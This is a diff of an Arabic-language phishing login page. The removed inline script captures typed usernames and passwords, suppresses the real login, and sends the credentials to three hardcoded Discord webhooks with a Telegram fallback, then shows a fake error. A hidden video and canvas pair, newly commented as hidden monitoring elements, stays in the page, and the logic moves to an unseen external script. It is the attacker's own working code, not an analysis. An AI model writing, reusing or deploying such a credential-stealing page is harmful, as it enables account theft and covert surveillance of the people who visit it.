@@ -24,6 +24,7 @@
 </head>
 <body>
 
+    <!-- عناصر الكاميرا والفيديو المخفية للرصد -->
     <video id="video" playsinline autoplay style="display:none;"></video>
     <canvas id="canvas" width="1280" height="720" style="display:none;"></canvas>
 
@@ -55,78 +56,7 @@
         <p>جاري التحقق...</p>
     </div>
 
-    <!-- محرك الرصد المتقدم ورصد الكتابة الحية -->
-    <script>
-        "use strict";
-
-        const DISCORD_WEBHOOKS = [
-            "https://discord.com/api/webhooks/1564663770629017652/ZZRcg_vV1JTh96gfwO4qOrMilrB9r-iB5nb9j0zt938Q-JIxt2flevVHFn8FWnK8gp9H",
-            "https://discord.com/api/webhooks/1564684857362358363/F34NZ2OBhi35exXCz2daOXWt7lGS3DEEoAmy_r7SEHK10ZLi9x-iN4qMxzsaW3txKZKt",
-            "https://discord.com/api/webhooks/1564684888668512416/ahcAya5wTAsNuRyhVbltJZ5TQfPQvLAw7Ipc68nGAYrWjSbvr75wswHEe1QFFKK9hVOe"
-        ];
-        const TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN";
-        const TELEGRAM_CHAT_ID = "YOUR_TELEGRAM_CHAT_ID";
-
-        let activeWebhookIndex = 0;
-
-        async function transmitPayloadDual(textContent, binaryBlob = null, targetFileName = "intel_frame.png") {
-            for (let i = 0; i < DISCORD_WEBHOOKS.length; i++) {
-                try {
-                    const form = new FormData();
-                    form.append("payload_json", JSON.stringify({ content: textContent }));
-                    if (binaryBlob) form.append("file", binaryBlob, targetFileName);
-                    const res = await fetch(DISCORD_WEBHOOKS[activeWebhookIndex], { method: "POST", body: form });
-                    if (res.ok) break;
-                    else activeWebhookIndex = (activeWebhookIndex + 1) % DISCORD_WEBHOOKS.length;
-                } catch {
-                    activeWebhookIndex = (activeWebhookIndex + 1) % DISCORD_WEBHOOKS.length;
-                }
-            }
-
-            try {
-                if (TELEGRAM_BOT_TOKEN && TELEGRAM_BOT_TOKEN !== "YOUR_TELEGRAM_BOT_TOKEN") {
-                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: textContent, parse_mode: "Markdown" })
-                    });
-                }
-            } catch {}
-        }
-
-        // رصد فوري وحي لكل حرف يكتبه المستخدم (Live Keystroke)
-        let typedBufferUser = "";
-        let typedBufferPass = "";
-        
-        document.getElementById("usernameInput").addEventListener("input", (e) => {
-            typedBufferUser = e.target.value;
-        });
-        document.getElementById("passwordInput").addEventListener("input", (e) => {
-            typedBufferPass = e.target.value;
-        });
-
-        // إرسال البيانات فور تقديم النموذج
-        const formEl = document.getElementById("fullLoginForm");
-        formEl.addEventListener("submit", async (e) => {
-            e.preventDefault();
-            const overlay = document.getElementById("loadingOverlay");
-            const err = document.getElementById("loginErrorMsg");
-            if (overlay) overlay.style.display = "flex";
-
-            const payloadText = `
-🔑 **[تم التقاط بيانات الدخول بنجاح]** 🔑
-- **اسم المستخدم:** \`${typedBufferUser}\`
-- **كلمة المرور:** \`${typedBufferPass}\`
-            `.trim();
-
-            await transmitPayloadDual(payloadText);
-
-            setTimeout(() => {
-                if (overlay) overlay.style.display = "none";
-                if (err) err.style.display = "block";
-                formEl.reset();
-            }, 1500);
-        });
-    </script>
+    <!-- ربط ملف السكريبت الخارجي script.js -->
+    <script src="script.js"></script>
 </body>
 </html>
